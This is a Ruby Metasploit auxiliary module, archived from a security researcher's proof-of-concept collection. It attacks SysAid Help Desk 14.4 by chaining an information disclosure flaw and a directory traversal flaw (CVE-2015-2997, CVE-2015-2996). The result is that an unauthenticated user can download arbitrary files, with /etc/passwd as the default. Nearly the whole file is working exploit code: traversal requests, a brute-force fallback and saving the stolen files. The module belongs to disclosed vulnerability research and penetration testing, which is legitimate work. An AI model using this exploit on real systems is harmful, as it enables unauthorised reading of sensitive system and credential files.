##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

# NOTE !!!
# This exploit is kept here for archiving purposes only.
# Please refer to and use the version that has been accepted into the Metasploit framework.

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => "SysAid Help Desk Arbitrary File Download",
      'Description' => %q{
        This module exploits two vulnerabilities in SysAid Help Desk that allows
        an unauthenticated user to download arbitrary files from the system. First an
        information disclosure vulnerability (CVE-2015-2997) is used to obtain the file
        system path, and then we abuse a directory traversal (CVE-2015-2996) to download
        the file. Note that there are some limitations on Windows: 1) the information
        disclosure vulnerability doesn't work; 2) we can only traverse the current drive,
        so if you enter C:\afile.txt and the server is running on D:\ the file will not
        be downloaded. This module has been tested with SysAid 14.4 on Windows and Linux.
        },
      'Author' =>
        [
          'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and MSF module
        ],
      'License' => MSF_LICENSE,
      'References' =>
        [
          [ 'CVE', '2015-2996' ],
          [ 'CVE', '2015-2997' ],
          [ 'URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/generic/sysaid-14.4-multiple-vulns.txt' ],
          [ 'URL', 'http://seclists.org/fulldisclosure/2015/Jun/8' ]
        ],
      'DisclosureDate' => 'Jun 3 2015'))

    register_options(
      [
        OptPort.new('RPORT', [true, 'The target port', 8080]),
        OptString.new('TARGETURI', [ true,  "SysAid path", '/sysaid']),
        OptString.new('FILEPATH', [false, 'Path of the file to download (escape Windows paths with a back slash)', '/etc/passwd']),
      ], self.class)
  end


  def get_traversal_path
    print_status("#{peer} - Trying to find out the traversal path...")
    large_traversal = '../' * rand(15...30)
    servlet_path = 'getAgentLogFile'

    # We abuse getAgentLogFile to obtain the
    res = send_request_cgi({
      'uri' => normalize_uri(datastore['TARGETURI'], servlet_path),
      'method' => 'POST',
      'data' => Zlib::Deflate.deflate(Rex::Text.rand_text_alphanumeric(rand(100) + rand(300))),
      'ctype' => 'application/octet-stream',
      'vars_get' => {
        'accountId' => large_traversal + Rex::Text.rand_text_alphanumeric(8 + rand(10)),
        'computerId' => Rex::Text.rand_text_alphanumeric(8 + rand(10))
      }
    })

    if res && res.code == 200
      if res.body.to_s =~ /\<H2\>(.*)\<\/H2\>/
        error_path = $1
        # Error_path is something like:
        # /var/lib/tomcat7/webapps/sysaid/./WEB-INF/agentLogs/../../../../../../../../../../ajkdnjhdfn/1421678611732.zip
        # This calculates how much traversal we need to do to get to the root.
        position = error_path.index(large_traversal)
        if position != nil
          return "../" * (error_path[0,position].count('/') - 2)
        end
      end
    end
  end


  def download_file (download_path)
    begin
      return send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(datastore['TARGETURI'], 'getGfiUpgradeFile'),
        'vars_get' => {
          'fileName' => download_path
        },
      })
    rescue Rex::ConnectionRefused
      print_error("#{peer} - Could not connect.")
      return
    end
  end


  def run
    # No point to continue if filepath is not specified
    if datastore['FILEPATH'].nil? || datastore['FILEPATH'].empty?
      print_error("Please supply the path of the file you want to download.")
      return
    else
      print_status("#{peer} - Downloading file #{datastore['FILEPATH']}")
      if datastore['FILEPATH'] =~ /([A-Za-z]{1}):(\\*)(.*)/
        filepath = $3
      else
        filepath = datastore['FILEPATH']
      end
    end

    traversal_path = get_traversal_path
    if traversal_path == nil
      print_error("#{peer} - Could not get traversal path, using bruteforce to download the file")
      count = 1
      while count < 15
        res = download_file(("../" * count) + filepath)
        if res && res.code == 200
          if res.body.to_s.bytesize != 0
            break
          end
        end
        count += 1
      end
    else
      res = download_file(traversal_path[0,traversal_path.length - 1] + filepath)
    end

    if res && res.code == 200
      if res.body.to_s.bytesize != 0
        vprint_line(res.body.to_s)
        fname = File.basename(datastore['FILEPATH'])

        path = store_loot(
          'sysaid.http',
          'application/octet-stream',
          datastore['RHOST'],
          res.body,
          fname
        )
        print_good("File saved in: #{path}")
      else
        print_error("#{peer} - 0 bytes returned, file does not exist or it is empty.")
      end
    else
      print_error("#{peer} - Failed to download file.")
    end
  end
end
